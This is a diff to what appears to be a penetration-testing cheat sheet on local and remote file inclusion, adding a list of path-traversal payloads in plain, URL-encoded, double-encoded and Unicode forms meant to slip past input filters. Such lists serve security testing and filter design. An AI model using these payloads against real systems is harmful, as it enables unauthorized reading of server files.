@@ -1,5 +1,20 @@
 # LFI / RFI
 
+## Path Traversal
+
+```
+../
+..\
+..\/
+%2e%2e%2f
+%252e%252e%252f
+%c0%ae%c0%ae%c0%af
+%uff0e%uff0e%u2215
+%uff0e%uff0e%u2216
+..././
+...\.\
+```
+
 ## LFI to RCE
 
 ### RCE with TXT upload
